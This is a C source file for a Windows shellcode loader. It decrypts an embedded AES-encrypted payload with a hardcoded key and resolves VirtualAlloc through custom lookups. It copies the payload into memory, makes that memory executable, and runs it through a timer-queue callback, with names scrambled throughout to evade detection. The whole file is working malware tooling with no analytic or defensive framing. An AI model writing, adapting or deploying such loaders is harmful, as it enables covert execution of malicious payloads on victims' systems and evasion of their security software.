#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include "zippers.h"
#include <psapi.h>
#include "sys.h"

typedef LPVOID(WINAPI* xyzVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);

unsigned char key[] =  { 0x3e, 0x16, 0xfb, 0x9, 0xad, 0xfd, 0x4e, 0xb1, 0xd7, 0xc0, 0x82, 0xc9, 0xcf, 0xed, 0x65, 0x98 };

int zzzPyNs_len = sizeof(zzzPyNs);

int DxxxyAcAz(char * zzzPyNs, unsigned int zzzPyNs_len, char * key, size_t keylen) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;

	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
			return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
			return -1;
	}
	if (!CryptHashData(hHash, (BYTE*) key, (DWORD) keylen, 0)){
			return -1;              
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
			return -1;
	}
	
	if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) zzzPyNs, (DWORD *) &zzzPyNs_len)){
			return -1;
	}
	
	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);
	
	return 0;
}


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {

	void* gigles;
	BOOL rv;
	HANDLE th;
	DWORD oldprotect = 0;
  
	xyzVirtualAlloc pVirtualAllocxyz = (xyzVirtualAlloc) zipGetProcAddress(picGetModuleHandle(L"KERNEL32.DLL"), "VirtualAlloc");
	
	gigles = pVirtualAllocxyz(0, zzzPyNs_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	DxxxyAcAz((char *) zzzPyNs, zzzPyNs_len, (char *) key, sizeof(key));

	memcpy(gigles, zzzPyNs, zzzPyNs_len);

	rv = VirtualProtect(gigles, zzzPyNs_len, PAGE_EXECUTE_READ, &oldprotect);
 
	HANDLE timer;
	HANDLE queue = CreateTimerQueue();
	HANDLE gDoneEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
	

	if (!CreateTimerQueueTimer(&timer, queue, (WAITORTIMERCALLBACK)gigles, NULL, 100, 0, 0)) {
	}
	
	if (WaitForSingleObject(gDoneEvent, INFINITE) != WAIT_OBJECT_0){
		   
	return 0;
}
 
 
}
 
